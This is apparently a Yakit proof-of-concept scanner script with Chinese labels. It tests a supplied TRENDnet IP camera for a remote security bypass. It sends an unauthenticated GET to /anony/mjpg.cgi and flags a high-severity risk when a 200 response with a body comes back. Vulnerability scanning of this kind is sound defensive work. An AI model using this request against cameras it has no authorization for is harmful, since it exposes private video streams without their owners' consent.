script_name: trendnet摄像头远程安全绕过漏洞检测
content:
##server:trendnet摄像头
##type:poc
##params:root_url
##name:trendnet_ip_camera_remote_security_bypass_poc
##severity:high
##out_put:trendnet_ip_camera_remote_security_bypass_res



yakit.AutoInitYakit()
log.setLevel("info")

poc=func(addr){
    isTls = str.IsTLSServer(addr)
    
    packet=`GET /anony/mjpg.cgi HTTP/1.1
Host: {{params(addr)}}
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36`
    rsp,req,err=poc.HTTP(
        packet,
        poc.https(isTls),
        poc.params({"addr":addr}),
        poc.redirectTimes(0),)
    if err != nil {
        die(err)
    }
    if str.MatchAllOfSubString(rsp, `HTTP/1.1 200`){
        rsp_header,rsp_body=poc.Split(rsp)
        if len(rsp_body)>0{
            risk.NewRisk(
                root_url,
                risk.severity("high"), 
                risk.title(f"FOUND ${root_url} 存在trendnet网络摄像头远程安全绕过漏洞"), 
                risk.titleVerbose("trendnet网络摄像头远程安全绕过漏洞"), 
                risk.type("身份伪造"), 
                risk.typeVerbose("配置错误"), 
                risk.details({"trendnet_ip_camera_remote_security_bypass_res":true}),             
                )
        }
    }
    

    
    }


root_url = cli.String("root_url")
ip, port, err = str.ParseStringToHostPort(root_url)
if err != nil {
    die(err)
}
addr = str.HostPort(ip, port)
poc(addr)
